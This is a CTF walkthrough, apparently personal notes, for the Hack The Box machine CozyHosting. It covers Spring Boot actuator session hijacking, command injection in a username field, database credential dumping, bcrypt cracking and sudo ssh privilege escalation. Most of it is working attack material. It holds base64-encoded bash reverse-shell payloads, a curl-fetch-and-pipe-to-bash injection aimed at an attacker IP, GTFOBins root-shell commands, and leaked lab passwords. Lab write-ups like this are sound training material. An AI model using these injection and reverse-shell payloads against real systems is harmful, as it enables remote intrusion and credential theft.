# Reconnaissance
- 10.10.11.230 : cozyhosting.htb - /etc/hosts
- Nmap output :
```bash
nmap -sV -sC -vv 10.10.11.230

---
Output:

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Cozy Hosting - Home
|_http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- nginx1.18.0, http, Linux OS
- ffuf, gobuster, dirbuster don't return anything useful.
- /assets/.. subdirectory
- not accessible.
- says no /error location so displayed on screen
- exploitable?
- BurpSuite
- we see cookie
- Login page 
- we try to login and we get an error message that prompts us to check /error page
- we get this whitelabel error
- on searching about this we see its related to Spring Boot java application
- we have a wordlist for this
- 2 ways to go about, ffuf (from walkthrough), I used dirsearch, maybe i got lucky:
- ffuf enumeration:
- first before knowing about spring boot:
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-
medium.txt:FFUZ -u http://cozyhosting.htb/FFUZ -ic -t 100
```
- we get some like index, login, admin, logout, error
- after finding out about spring boot
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/spring-boot.txt:FFUZ
-u http://cozyhosting.htb/FFUZ -ic -t 100
```
- we find actuator path is accessible
- **maybe got lucky with this search** from dirsearch we find /actuator directory
```bash
dirsearch -u cozyhosting.htb
```
- leaders us to /actuator/sessions which holds user session key
- we can change that either in burp suite or in our browser by changing our cookie to that
- we login as admin of web page
- we see connection settings where we can enter address
- we try ours but connection refused obvously
- we try localhost as kadmin but we get rejected as we dont have key
- we try to inject code in both fields and find username is injectable
```bash
;<command>;
```
### Testing the connect option below
- we try to connect to localhost while we test for injection
- we find that we can inject by putting our code into  the username field
- **Method 1 : IPPSec**
- we again connect to localhost and capture a test input in username.
- capture packet in BurpSuite > Send to Repeater
- enter this command  into username field while having nettcat listener on and send packet:
```bash
;{sleep,2}; # to test, we see a delay
;{echo,YmFzaCAgLWkgPiYgL2Rldi90Y3AvPGxvY2FsX2lwPi85OTk4ICAwPiYxICAK}|{base64,-d}|bash;
```
- How? We create our exploit, base 64 encode it, remove the additional +, = characters and then pass it to burpsuite
- we also see the last bash command isnt in {}
- test in our machine if the command executes to reverse shell. 
- we see bash with {} doesn't work
```bash
vi shell # bash -i >& /dev/tcp/<local_ip>/9998 0>&1 
base64 -w 0 shell
{echo,YmFzaCAgLWkgPiYgL2Rldi90Y3AvPGxvY2FsX2lwPi85OTk4ICAwPiYxICAK}|{base64,-d}|bash
```
- Alternatively, instead of adding spaces, you could siply add the command to our burp suite and url encode (Ctrl+U) and it will look like this :
```bash
host=127.0.0.1&username=%3b{echo,YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yNS85OTk5IDA%2bJjEK}|{base64,-d}|bash%3b
```
**Note: we see , and when testing in bash it won't work. testing with , works in zsh so keep that in mind**
- in walkthrough pdf we do see a different way which i believe is compatible for bash
```bash
echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh
```
- We see they use \n instead of ,
- then in our username injection input we pass this command while listening on our netcat listener:
```bash
test;curl${IFS}http://10.10.14.49:7000/rev.sh|bash;
```
- $(IFS) works with curl (but not a bash command..why?)
- represents space
- calls our command and executes via bash
- We gain foothold as appp but not user for user flag
- unzip the jar file
- we find credentials is:
```bash
app@cozyhosting:/tmp/app/BOOT-INF/classes$ cat application.properties
cat application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxRapp@cozyhosting:/tmp/app/BOOT-INF/classes$ 
```
- User : postgres
- Password : Vg&nvzAQ7XxR
- enter postgresql
```bash
psql -h 127.0.0.1 -U postgres
Password:Vg&nvzAQ7XxR
\l
```
- Output for list all database:
```bash
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
eges   
-------------+----------+----------+-------------+-------------+----------------
-------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
(4 rows)

```
- enter database and list tables:
```bash
\c
\dt
```
- Output:
```bash
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

```
- List users:
```bash
select * from users;

--OUTPUT--
   name    |                           password                           | role
  
-----------+--------------------------------------------------------------+-----
--
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
n
(2 rows)

```
- crack hash:
```bash
vi hash # copy hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt

--OUTPUT--
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:20 DONE (2025-03-28 17:04) 0.04812g/s 135.1p/s 135.1c/s 135.1C/s catcat..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                  
```
- Password: manchesterunited
- 

## Privilege Escalation 
- sudo -l reveals ssh can be used as sudo
- Check GTFObins for ssh shell
- These commands work :
```bash
ssh -o ProxyCommand=';sh 0<&2 1>&2' x
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
```
- Why?
- It is a way to pass a command before ssh'ing into the machine. Why?
- before when connecting to a machine behind a firewall, a direct connection wouldnt work due to say a good firewall.
- So people would ssh into a Bastion machine which would do something like
- ssh -L `<port>` `<host>` and forward the ssh to the target machine
- but if the ssh tunnel isn't active before ssh'ing into the machine it wouldn't work
- so this makes things easier by making sure it passes the ssh command before we ssh into the machine
- We get root access
## Rabbit Holes
- finding creds for lateral movement

- also
```bash
username=kanderson&password=MRdEQuv6~6P.-v
```
